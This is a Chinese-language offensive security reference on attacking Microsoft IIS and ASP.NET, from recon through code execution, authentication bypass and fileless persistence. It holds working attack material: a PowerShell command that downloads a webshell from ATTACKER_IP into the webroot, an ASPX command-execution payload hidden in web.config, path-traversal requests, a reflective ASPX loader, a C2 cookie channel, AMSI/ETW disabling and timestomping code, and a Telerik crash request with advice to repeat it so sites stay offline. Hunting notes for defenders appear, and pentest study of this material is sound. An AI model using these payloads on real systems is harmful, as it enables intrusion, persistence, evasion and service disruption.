---
attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 信息泄露
impact:
  - 远程代码执行
  - 权限提升
  - 信息泄露
risk_level: 严重
prerequisites:
  - HTTP 协议基础
  - ASP.NET 管道与 web.config 配置
  - Windows 认证机制 (NTLM / Kerberos)
related_techniques:
  - file-upload
  - http-request-smuggling
  - waf-bypass
  - parameter-pollution
  - deserialization
difficulty: 高级
tools:
  - iis-shortname-scanner
  - aspnet-regiis
  - metasploit
  - dnspy
---

# IIS — Internet Information Services Attack Surface — IIS 攻击面分析

> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md) · [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [ViewState Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md)

---

### 知识路径

```
IIS Security（本文档）
  ├── 前置知识：HTTP 协议 — CRLF、请求/响应结构
  │   └── 参见：User input/Reflected Values/CRLF
  ├── 前置知识：ASP.NET 基础 — 管道、HTTP Handler、web.config
  ├── 进阶：Telerik UI WebResource.axd CVE-2025-3600（深度分析）
  ├── 进阶：IIS 无文件后门与 NET-STAR 攻击技术检测
  ├── 关联：File Upload — IIS 解析绕过
  │   └── 参见：Files/File Upload
  ├── 关联：HTTP Request Smuggling — IIS 作为后端
  │   └── 参见：Proxies/HTTP Request Smuggling
  ├── 关联：WAF Bypass — IIS / ASP Classic 过滤器规避
  │   └── 参见：Proxies/Proxy & WAF Protections Bypass
  └── 关联：Parameter Pollution — ASP.NET / IIS 逗号拼接
      └── 参见：Other Helpful Vulnerabilities/Parameter Pollution
```

---

# 0x01 IIS 攻击面 — 原理与分类

## 1.1 IIS 架构概览

IIS（Internet Information Services）是 Microsoft 的可扩展 Web 服务器，深度集成于 Windows 操作系统与 .NET 运行时。其攻击面跨越多个层次：

- **HTTP.sys** — 内核模式 HTTP 监听器，所有 IIS 应用程序池共享。负责请求解析、SSL/TLS 终结、响应缓存。此层的漏洞（如 HTTP.sys Range 头 CVE-2015-1635）影响服务器上所有站点。
- **WAS（Windows Process Activation Service）** — 管理应用程序池生命周期、工作进程（w3wp.exe）激活和身份分配。
- **w3wp.exe**（IIS 工作进程）— 承载 .NET CLR、已加载模块和应用程序代码。是内存中代码执行的主要目标。
- **ISAPI / 原生模块** — C/C++ 过滤器和扩展（如 `asp.dll`、WebDAV、URL Rewrite）。历史上是解析漏洞的频发来源（IIS 6.0 分号解析、WebDAV PROPATCH 溢出）。
- **托管管道** — ASP.NET 管道，包含 HTTP Module 和 HTTP Handler。通过 `web.config` 声明进行扩展；配置不当的 Handler（如 Telerik `WebResource.axd`、`trace.axd`）暴露无需认证的攻击面。

IIS 识别的关键可执行文件扩展名：

- `asp` — Classic ASP（Active Server Pages）
- `aspx` — ASP.NET Web Forms / MVC
- `config` — Web.config 文件（可被上传并滥用于代码执行）
- `php` — 通过 FastCGI 安装 PHP 时

## 1.2 攻击面分类

IIS 漏洞按根因（C14）分类，而非 payload 形式：

| 类别 | 分类名称 | 典型案例 |
|------|---------|---------|
| 配置缺陷 | 配置缺陷 | 可写 webroot、trace.axd 暴露、默认密钥、web.config 滥用 |
| 认证/授权绕过 | 认证/授权绕过 | CVE-2022-30209 哈希碰撞、Basic 认证 `:$i30:$INDEX_ALLOCATION` 绕过、ASPXAUTH Cookie 复用 |
| 信息泄露 | 信息泄露 | 波浪号短文件名泄露、Location 头内部 IP 泄露、路径遍历 → 源代码 |
| 协议解析差异 | 协议解析差异 | IIS 6.0 分号解析、WebDAV 扩展名混淆 |
| 注入类 | 注入类 | Telerik 不安全反射（类型构造器注入）、URL Rewrite SSRF |
| 密码学误用 | 密码学误用 | ASP.NET machineKey 默认值、DPAPI 密钥环同目录存放 |

## 1.3 版本演变

| 版本 | Windows 版本 | 关键攻击面变化 |
|------|-------------|--------------|
| IIS 6.0 | Windows Server 2003 | 默认仅支持 ASP（未集成 .NET），WebDAV 默认启用，分号解析漏洞，`asp/asa/cer/cdx` 均被解释为 ASP |
| IIS 7.0 | Windows Server 2008 | 集成管道（.NET + IIS 统一），`web.config` Handler 注册，`trace.axd` |
| IIS 7.5 | Windows Server 2008 R2 | Basic 认证 `:$i30:$INDEX_ALLOCATION` 绕过，FastCGI PHP `cgi.fix_pathinfo` 解析 |
| IIS 8.0/8.5 | Windows Server 2012/2012 R2 | HTTPAPI 2.0，改进的日志记录，集中式证书管理 |
| IIS 10.0 | Windows Server 2016/2019/2022 | HTTP/2 支持，IIS Express 开发服务器，ASP.NET Core 托管模块 |

---

# 0x02 侦察与指纹识别

## 2.1 IIS 目录/文件爆破

合并六个上游列表的综合性字典（`iisfinal.txt`），用于 IIS 目录和文件枚举：

- [SecLists IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)
- [ASP.NET Client Folder Enumeration](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)
- [DirBuster-NG iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)
- [SVNDigger aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)
- [SVNDigger asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)
- [wfuzz iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

> ⚠️ **使用注意**：使用时无需追加任何扩展名 — 需要扩展名的路径已在字典中包含。字典同时包含目录名和完整文件路径，包括遗留的 IIS 管理端点、FrontPage Server Extensions（`_vti_*`）和 IISADMPWD 密码管理路径。

值得关注的遗留路径及其已知漏洞：

```
/iisadmpwd/achg.htr — 修改密码（IIS 4.0/5.0）
/iisadmpwd/aexp.htr — 密码过期
/iisadmpwd/anot.htr — 通知密码变更
/iissamples/ — 默认示例应用程序
/scripts/tools/newdsn.exe — DSN 创建工具
/msadc/ — RDS/ADC（CVE-1999-1011）
/_vti_bin/shtml.dll — FrontPage Server Extensions
```

## 2.2 波浪号 ~ 短文件名泄露

IIS 支持 Windows 8.3 短文件名命名规范。当请求中包含波浪号（`~`）时，IIS 尝试使用短文件名进行解析。即使有认证保护，也能泄露文件/文件夹名的**前 6 个字符**和扩展名的**前 3 个字符**。

**工具：**

```bash
# Java 版扫描器（原始版本）
java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/

# Metasploit 模块
use scanner/http/iis_shortname_scanner
```

**LLM 增强重建**：发现短文件名后，使用基于 LLM 的模糊测试猜测完整文件名：

```python
# 来自 Invicti-Security/brainstorm
# 使用 LLM 生成缩略文件名的可能补全
# https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py
```

**局限性：**
- 仅泄露文件名前 6 个字符 + 扩展名前 3 个字符
- 依赖 8.3 短文件名生成功能启用（系统盘默认启用）
- 可能需要重复请求（扫描器使用 2 线程，可配置延迟）

**原始研究：**[soroush.secproject.com — Microsoft IIS Tilde Character Vulnerability/Feature（PDF）](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

**工具：**[github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

[图片: IIS ShortName scanner Java GUI 输出，展示枚举出的短文件名]

## 2.3 内部 IP 地址泄露

对于返回 302 重定向的 IIS 服务器，去掉 `Host` 头并使用 HTTP/1.0 可能导致服务器在 `Location` 头中泄露其内部 IP：

```shell
nc -v domain.com 80
openssl s_client -connect domain.com:443
```

请求：

```http
GET / HTTP/1.0

```

响应泄露内部 IP：

```http
HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```

此技术对部署在 IIS 上的 Exchange OWA 尤其有效。关于 Host 头操控的相关技术，参见 [HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md) 和 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md)，这些技术常利用 Host 头控制造成后端混淆。

## 2.4 HTTPAPI 2.0 404 指纹识别

当 `Host` 头不匹配任何已配置的站点绑定时，HTTPAPI 2.0 返回特征性的 404 错误页面：

[图片: HTTPAPI 2.0 404 Not Found 错误页面 — 表示服务器未收到 Host 头中的正确域名]

> **恢复方法**：检查服务器提供的 SSL 证书以获取正确的域名/子域名。若未找到，通过 VHost 爆破直到识别出正确的 `Host` 头。

## 2.5 ASP.NET Trace.AXD 调试端点

ASP.NET 包含通过 `trace.axd` 访问的调试模式，记录详细的请求信息，包括：

- 远程客户端 IP 地址
- 会话 ID
- 所有请求和响应 Cookie
- 服务器物理路径
- 源代码信息
- **请求参数中可能包含的用户名和密码**

```http
GET /Trace.axd HTTP/1.1
Host: target.com
```

[图片: ASP.NET Trace.AXD 详细应用程序跟踪日志，展示请求历史]

> **注意**：`trace.axd` 需要在 `web.config` 中配置 `<trace enabled="true" pageOutput="false" requestLimit="40" localOnly="false"/>`。虽然 `localOnly="true"` 是默认值，但很多部署会将其设为 `false` 以便远程调试。

参考资料：[Rapid7 — ASP.NET Trace.AXD 漏洞](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

---

# 0x03 基于配置的代码执行

## 3.1 可写 Webroot → ASPX 命令 Shell

### 3.1.1 机制

如果低权限用户或组对 **`C:\inetpub\wwwroot` 具有写权限**，攻击者可以放置 ASPX webshell 并以应用程序池身份执行系统命令。

### 3.1.2 权限验证

```powershell
# 检查 webroot 的 ACL
icacls C:\inetpub\wwwroot

# 遗留等效命令
cacls .
```

查找你的用户或组是否有 `(F)`（完全控制）或 `(W)`（写入）。

### 3.1.3 利用

```powershell
# 下载并放置命令 webshell
iwr http://ATTACKER_IP/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx
```

请求 `/shell.aspx` 并执行命令。身份通常显示为 `iis apppool\defaultapppool`。

### 3.1.4 提权链

AppPool 身份通常持有 **SeImpersonatePrivilege**。结合 Potato 系列本地提权（GodPotato、SigmaPotato、JuicyPotato）可以从 AppPool 身份提升到 `NT AUTHORITY\SYSTEM`。完整提权方法论参见 [Windows Local Privilege Escalation](~/Documents/hacktricks/src/windows-hardening/windows-local-privilege-escalation/README.md)。

> **限制**：需要独立的写访问漏洞（如 NTFS 权限配置错误、可写 webroot 的 FTP、匿名 WebDAV 上传）。

## 3.2 上传 .config 文件实现代码执行

### 3.2.1 机制

IIS 将 `.config` 文件（特别是 `web.config`）作为服务器端配置进行处理。这种攻击通常与 [File Upload](../../Files/File%20Upload/README.md) 漏洞形成攻击链 — `.config` 扩展名比 `.aspx` 或 `.php` 更少被上传过滤器拦截。如果攻击者能将 `web.config` 文件上传到 Web 可访问目录，可以：

1. 在 CDATA 段或 HTML 注释中注入 ASP.NET 代码
2. 定义新的 HTTP Handler 指向恶意代码
3. 覆盖安全限制（如禁用请求验证）

### 3.2.2 示例 Payload

在文件末尾的 HTML 注释中附加代码：

```xml
<!--
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    Response.Write(p.StandardOutput.ReadToEnd());
%>
-->
```

> **参考 Payload：**[PayloadsAllTheThings — Configuration IIS web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

### 3.2.3 条件

- 文件上传端点必须接受 `.config` 扩展名（通常不会被专注于 `.aspx`、`.asp`、`.php` 的上传过滤器拦截）
- 上传的 `web.config` 必须被 IIS 解析（放置在 Web 可访问目录中）
- 应用程序池必须具有执行权限

> **深度分析：**[Soroush SecProject — Upload a Web.config File for Fun & Profit（2014）](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## 3.3 ASP.NET 路径遍历 → 源代码泄露

### 3.3.1 机制

在 .NET MVC 应用中，`web.config` 文件通过 `<assemblyIdentity>` XML 标签指定每个二进制依赖。利用路径遍历漏洞（如文件下载端点），攻击者可以：

1. 下载 `web.config` → 枚举程序集标识和命名空间
2. 下载 `/bin/` 目录中引用的 DLL → 逆向工程发现新命名空间
3. 跳转到命名空间特定的 `web.config` 文件 → 寻找其他程序集
4. 递归重复直到完整源代码被映射

### 3.3.2 攻击过程

**第一步：下载根 web.config**

```http
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```

响应揭示：
- **EntityFramework** 版本
- 网页、客户端验证、JavaScript 的 **AppSettings**
- 认证和运行时的 **System.web** 配置
- **System.webServer** 模块设置
- **Runtime** 程序集绑定（`Microsoft.Owin`、`Newtonsoft.Json`、`System.Web.Mvc` 等）
- 文件路径如 `/bin/WebGrease.dll`

**第二步：提取敏感根目录文件**

```
/global.asax — 应用程序生命周期 Handler
/connectionstrings.config — 数据库密码（未加密时为明文）
```

**第三步：跳转到命名空间特定的 web.config**

```http
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```

**第四步：下载编译后的 DLL**

```http
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```

如果某个 DLL 导入了 `WebApplication1.Areas.Minded` 命名空间，攻击者可推断 `/Minded/Views/web.config` 存在，该文件可能引用更多 DLL，如 `WebApplication1.AdditionalFeatures.dll`。

### 3.3.3 条件与限制

- 目标应用需要存在可利用的路径遍历（如 `download_page?id=`）
- DLL 是编译后的 IL — 需要 .NET 反编译器（dnSpy、ILSpy、dotPeek）提取字符串和逻辑
- `connectionstrings.config` 可能使用了 ASP.NET 加密保护（需要 §3.4 解密）

> **深度分析：**[MindedSecurity — From Path Traversal to Source Code in .NET（2018）](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

### 3.3.4 常见 IIS/ASP.NET 敏感文件

来自 [Absolomb Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)：

```
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\connectionstrings.config
C:\inetpub\wwwroot\global.asax
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
```

## 3.4 解密加密配置与 Data Protection 密钥环

### 3.4.1 ASP.NET 加密配置（Full Framework）

ASP.NET（Full Framework）使用 `RsaProtectedConfigurationProvider` 加密 `web.config` 中的 `<connectionStrings>` 等配置节。拥有文件系统或交互访问权限后，同目录存放的密钥容器允许解密：

```cmd
# 按应用程序路径解密（IIS 中已配置的站点）
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# 按物理路径解密（-pef / -pdf 写入/读取指定目录下的配置文件）
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```

### 3.4.2 ASP.NET Core Data Protection 密钥环

ASP.NET Core 将 Data Protection 密钥环存储在本地，用于保护应用程序密钥和 Cookie。获取密钥环并以应用程序身份运行时，操作者可以用相同目的实例化 `IDataProtector` 并解密已保护的密钥。

**密钥环位置：**

- `%PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys`（XML/JSON 文件）
- `HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys`（注册表）
- 应用程序管理的文件夹（如 `App_Data\keys` 或应用旁的 `Keys` 目录）

> **警告：** 将密钥环与应用文件存放在同一目录的配置错误，使得一旦主机被入侵即可进行离线解密。密钥环应存储在独立的、访问受控的位置。

---

# 0x04 认证与授权绕过

## 4.1 CVE-2022-30209 — 哈希表缓存认证绕过

### 4.1.1 机制

IIS 认证代码中的一个缺陷导致密码验证错误：如果攻击者提供的密码哈希与认证缓存中已存在的键发生碰撞，攻击者无需知道真实密码即可被认证为缓存中的用户。

### 4.1.2 哈希函数分析

漏洞源于密码缓存查找使用的非密码学哈希函数：

```python
def HashString(password):
    j = 0
    for c in map(ord, password):
        j = c + (101*j)&0xffffffff
    return j
```

**碰撞示例：**

```python
assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')
```

### 4.1.3 利用

```bash
# 成功登录前 — 401 Unauthorized
curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | grep HTTP
HTTP/1.1 401 Unauthorized

# 碰撞哈希的合法用户登录后，攻击者复用缓存条目
curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | grep HTTP
HTTP/1.1 200 OK
```

### 4.1.4 条件

- 目标必须使用 IIS Windows 认证或 Basic 认证
- 密码哈希与攻击者碰撞的合法用户必须最近认证过（缓存条目存在）
- 窗口期受缓存 TTL 限制

> **完整分析：**[Orange Tsai — Let's Dance in the Cache: Destabilizing Hash Table on Microsoft IIS（2022）](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)

## 4.2 Basic 认证绕过（IIS 7.5）

### 4.2.1 机制

IIS 7.5 的 Basic 认证可通过在用户名字段中使用 NTFS 备用数据流语法绕过：

```
/admin:$i30:$INDEX_ALLOCATION/admin.php
/admin::$INDEX_ALLOCATION/admin.php
```

### 4.2.2 组合攻击

结合波浪号短文件名枚举（§2.2）发现受保护的目录和文件名，然后绕过认证访问它们。

> **限制：** 此绕过仅适用于 IIS 7.5。现代 IIS 版本（8.0+）不受影响。

## 4.3 ASPXAUTH Cookie 复用（默认密钥）

### 4.3.1 机制

ASPXAUTH Cookie 使用以下 machineKey 参数：

- **`validationKey`**（字符串）：用于签名验证的十六进制编码密钥
- **`decryptionMethod`**（字符串）：默认 "AES"
- **`decryptionIV`**（字符串）：十六进制编码初始化向量（默认为零向量）
- **`decryptionKey`**（字符串）：用于解密的十六进制编码密钥

如果部署使用**默认值**且用**用户邮箱**作为 Cookie 中的身份标识，攻击者可以：

1. 找到使用相同平台且使用默认 machineKey 的另一个 Web 应用
2. 在第二个应用上用目标用户的邮箱创建账号
3. 从第二个应用提取 ASPXAUTH Cookie
4. 将 Cookie 重放到目标应用以冒充该用户

> **真实案例：** 此技术在 Facebook 漏洞赏金中成功使用。[InfosecWriteups — How I Hacked Facebook Part Two](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)

### 4.3.2 检测

检查 `web.config` 中的 `<machineKey>` 元素。如果 `validationKey` 或 `decryptionKey` 设置为已知默认值（如 `AutoGenerate`、来自模板的硬编码十六进制字符串），则应用存在此漏洞。

## 4.4 IIS 6.0 基于解析的访问绕过

这些解析漏洞最常见的利用途径是 [File Upload](../../Files/File%20Upload/README.md) 端点 — 上传过滤器看到良性扩展名，而 IIS 将文件解释为可执行 ASP 脚本。关于上传验证的绕过技术，另见 [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md)。

### 4.4.1 ASP/ASA 目录解析

在 IIS 6.0 上，**任何文件**放置在以 `.asp` 或 `.asa` 扩展名命名的目录中（如 `/uploads.asp/`）都将作为 ASP 脚本执行 — 无论文件的实际扩展名是什么。

### 4.4.2 分号扩展名混淆（WebDAV）

当 IIS 6.0 启用 WebDAV 时，请求 `evil.asp;.jpg` 会导致 IIS 将 `;.jpg` 解释为参数而非扩展名，将 `evil.asp` 作为 ASP 脚本执行。这绕过了仅检查最终扩展名的上传过滤器。

### 4.4.3 默认可执行扩展名

IIS 6.0 默认将以下扩展名解释为 ASP 脚本：

- `.asp` — Active Server Pages
- `.asa` — Global.asa（应用程序级 ASP）
- `.cer` — 证书文件（默认映射到 ASP Handler）
- `.cdx` — Compound Index（默认映射到 ASP Handler）

> **注意：** `.cer` 和 `.cdx` 映射是 IIS 4.0/5.0 时代的遗留默认值。现代 IIS 版本已移除这些 Handler 映射。

### 4.4.4 IIS 7.5 FastCGI PHP 解析

当 PHP 在 IIS 7.5 上以 FastCGI 模式运行，且 `cgi.fix_pathinfo=1` 且未勾选 `Invoke handler only if request is mapped to` 时，在任何上传文件名后追加 `/.php` 都能触发 PHP 执行：

```
uploads/evil.jpg/.php → 作为 PHP 执行
```

---

# 0x05 无文件持久化与高级攻击技术

## 5.1 NET-STAR / Phantom Taurus 架构

Phantom Taurus（APT）的 NET-STAR 工具包展示了在 `w3wp.exe` 内部实现完全无文件 IIS 持久化的成熟模式。其核心思想可复用于自定义攻击技术和检测/狩猎。

**关键构建块：**

1. **ASPX 引导程序承载嵌入式 payload** — 单个 `.aspx` 页面包含 Base64 编码（可选 Gzip 压缩）的 .NET DLL。触发请求时解码、解压并通过 `Assembly.Load(byte[])` 反射加载。
2. **Cookie 作用域的加密 C2** — 任务和结果包装：Gzip → AES-ECB/PKCS7 → Base64。通过看似合法的 Cookie 密集请求传输，使用稳定分隔符（如 `"STAR"`）进行分块。
3. **反射式 .NET 执行** — 接收任意托管程序集的 Base64 编码，通过 `Assembly.Load()` 加载，调用操作者指定的入口点，无需接触磁盘。
4. **预编译站点 Shell 管理** — 命令 `bypassPrecompiledApp`、`addshell`、`listshell`、`removeshell` 用于管理预编译 ASP.NET 站点中的后门。
5. **时间戳伪造** — `changeLastModified` 动作用于反取证，包括在部署文件上设置未来时间戳。

## 5.2 ASPX 引导程序加载器模式

承载、解码并反射加载嵌入式 .NET payload 的最小 ASPX 页面：

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
    // 1) 获取 payload 字节（硬编码 blob 或从请求中提取）
    string b64 = /* 硬编码或 Request["d"] */;
    byte[] blob = Convert.FromBase64String(b64);
    // 可选：如果使用了 AES，在此解密
    using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
        using(var ms = new MemoryStream()){
            gz.CopyTo(ms);
            var asm = Assembly.Load(ms.ToArray());
            // 2) 调用托管入口点（如 ServerRun.Run）
            var t = asm.GetType("ServerRun");
            var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
            object inst = m.IsStatic ? null : Activator.CreateInstance(t);
            m.Invoke(inst, new object[]{ HttpContext.Current });
        }
    }
}
</script>
```

## 5.3 Gzip + AES-ECB C2 Cookie 通道

用于基于 Cookie 的 C2 的打包/解包辅助函数：

```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
    using(var aes = Aes.Create()){
        aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
        ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
        return t.TransformFinalBlock(data, 0, data.Length);
    }
}

static string Pack(object obj, byte[] key){
    // 序列化 → gzip → AES-ECB → Base64
    byte[] raw = Serialize(obj);                    // TLV / JSON / msgpack
    using var ms = new MemoryStream();
    using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
    byte[] enc = AesEcb(ms.ToArray(), key, true);
    return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
    byte[] enc = Convert.FromBase64String(b64);
    byte[] cmp = AesEcb(enc, key, false);
    using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
    using var outMs = new MemoryStream(); gz.CopyTo(outMs);
    return Deserialize<T>(outMs.ToArray());
}
```

### 5.3.1 命令面板

NET-STAR 部署中观察到的命令：

- **文件操作：**`fileExist`、`listDir`、`createDir`、`renameDir`、`fileRead`、`deleteFile`、`createFile`
- **Shell 管理：**`addshell`、`bypassPrecompiledApp`、`listShell`、`removeShell`
- **数据库：**`executeSQLQuery`、`ExecuteNonQuery`
- **代码执行：**`code_self`、`code_pid`、`run_code`（内存中的 .NET 执行）
- **反取证：**`changeLastModified`

## 5.4 时间戳伪造与反取证

```csharp
File.SetCreationTime(path, ts); 
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```

操作者部署了带未来时间戳的 ASPX 文件，以规避基于时间线的数字取证。

## 5.5 AMSI / ETW 禁用（内存 Payload）

在反射加载操作者程序集之前，加载器可以修补 AMSI 和 ETW 以减少对内存 payload 的检查：

```csharp
// 修补 amsi!AmsiScanBuffer 使其返回 E_INVALIDARG
// 修补 ntdll!EtwEventWrite 为 stub；然后加载操作者程序集
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```

> **背景知识：**参见 [AMSI/ETW 绕过技术](~/Documents/hacktricks/src/windows-hardening/av-bypass.md) 获取完整方法论。

### 5.5.1 狩猎要点（防御方）

- 包含超长 Base64/Gzip blob 的孤立异常 ASPX 页面；Cookie 密集的 POST 请求
- `w3wp.exe` 中无文件对应的托管模块；内存中出现 `Encrypt/Decrypt`（ECB）、`Compress/Decompress`、`GetContext`、`Run` 等字符串
- 流量中重复出现的分隔符如 `"STAR"`
- ASPX/程序集上的时间戳不匹配或为未来时间
- 来自异常调用栈（非典型应用启动路径）的 `Assembly.Load(byte[])` 调用

---

# 0x06 第三方组件攻击

## 6.1 Telerik UI WebResource.axd CVE-2025-3600 — 不安全反射

### 6.1.1 概述

许多 ASP.NET 应用嵌入 **Telerik UI for ASP.NET AJAX** 并暴露无需认证的 Handler `Telerik.Web.UI.WebResource.axd`。当 Image Editor 缓存端点可访问（`type=iec`）时，参数 `dkey=1` 和 `prtype` 启用**不安全反射**，执行任意公共无参构造器 — **无需认证**。这是与 Telerik 旧版 [ViewState 反序列化](../../User%20input/Structured%20objects/Deserialization/README.md) CVE-2019-18935（RAU Handler `type=rau`）不同的攻击，尽管两者都存在于同一个 `Telerik.Web.UI.dll` 程序集中。

### 6.1.2 受影响版本

- Telerik UI for ASP.NET AJAX 版本 **2011.2.712 至 2025.1.218**（含）受影响
- **2025.1.416**（2025-04-29 发布）中修复

### 6.1.3 检测

```bash
# 检查 Handler 暴露
curl -skI https://target/Telerik.Web.UI.WebResource.axd

# 探测存在漏洞的端点
curl -sk 'https://target/Telerik.Web.UI.WebResource.axd?type=iec'
```

不要依赖在 `/` 或登录页上找到 "Telerik" 字符串 — Sitecore 等产品通常暴露该 Handler 而不在默认 HTML 中引用。

需搜索的 Handler 注册签名：

```xml
<!-- system.web -->
<add path="Telerik.Web.UI.WebResource.axd" type="Telerik.Web.UI.WebResource" verb="*" validate="false" />

<!-- system.webServer -->
<add name="Telerik_Web_UI_WebResource_axd" path="Telerik.Web.UI.WebResource.axd" type="Telerik.Web.UI.WebResource" verb="*" preCondition="integratedMode" />
```

### 6.1.4 根因

Image Editor 缓存下载流程构造 `prtype` 中提供的类型的实例，仅在之后才将其转换为 `ICacheImageProvider` 并验证下载密钥 — **构造器在验证失败时已经执行**。

```csharp
// 入口点
public void ProcessRequest(HttpContext context)
{
    string text = context.Request["dkey"];           // dkey
    string text2 = context.Request.Form["encryptedDownloadKey"]; // 下载密钥
    ...
    if (this.IsDownloadedFromImageProvider(text)) // 实际检查 dkey == "1"
    {
        ICacheImageProvider imageProvider = this.GetImageProvider(context); // 在此处实例化
        string key = context.Request["key"];
        if (text == "1" && !this.IsValidDownloadKey(text2))
        {
            this.CompleteAsBadRequest(context.ApplicationInstance);
            return; // 类型转换/检查发生在构造器执行之后
        }
        ...
    }
}

private ICacheImageProvider GetImageProvider(HttpContext context)
{
    if (!string.IsNullOrEmpty(context.Request["prtype"]))
    {
        return RadImageEditor.InitCacheImageProvider(
            RadImageEditor.GetICacheImageProviderType(context.Request["prtype"]) // [A]
        );
    }
    ...
}

public static Type GetICacheImageProviderType(string imageProviderTypeName)
{
    return Type.GetType(string.IsNullOrEmpty(imageProviderTypeName) ?
        typeof(CacheImageProvider).FullName : imageProviderTypeName); // [B]
}

protected internal static ICacheImageProvider InitCacheImageProvider(Type t)
{
    // 不安全：在强制接口类型安全之前构造
    return (ICacheImageProvider)Activator.CreateInstance(t); // [C]
}
```

**利用原语：** 受控类型字符串 → `Type.GetType()` 解析 → `Activator.CreateInstance()` 执行其公共无参构造器。即使之后被拒绝，**Gadget 的副作用已经发生**。

### 6.1.5 通用 DoS Gadget

```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```

`System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper` 类（PowerShell）的终结器会释放一个未初始化的句柄，在 GC 终结时触发未处理异常 — 可靠地**崩溃 IIS 工作进程（w3wp.exe）**。

> 定期发送以维持站点离线。

### 6.1.6 RCE 升级模式

1. **处理攻击者输入的无参构造器** — 某些构造器读取请求体/查询/Cookie/头并进行反序列化（如 Sitecore `GetLayoutDefinition()` 读取 HTTP 体中的 `layout`，通过 JSON.NET 反序列化 JSON）。
2. **触碰文件的构造器** — 如果攻击者能写入目标路径，加载配置/blob 的构造器可被利用。
3. **AppDomain.AssemblyResolve 滥用** — 注册不安全解析器 → 请求不存在的类型 → 解析器从 `args.Name` 构建 DLL 路径而未做处理 → 加载攻击者控制的 DLL。

